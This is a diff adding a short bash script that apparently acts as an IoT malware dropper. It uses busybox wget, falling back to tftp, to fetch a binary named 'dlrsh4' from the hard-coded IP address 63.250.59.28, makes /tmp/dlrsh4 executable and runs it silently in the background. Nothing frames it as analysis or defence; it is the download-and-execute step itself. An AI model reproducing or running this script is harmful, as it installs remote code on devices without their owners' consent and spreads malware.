@@ -1,0 +1,5 @@
+#!/bin/bash
+echo "sh4 binary executed successfully"
+/bin/busybox wget -O - http://63.250.59.28:80/dlrsh4 || /bin/busybox tftp -g -r dlrsh4 63.250.59.28 || echo "Download failed"
+chmod +x /tmp/dlrsh4 2>/dev/null
+/tmp/dlrsh4 2>/dev/null &
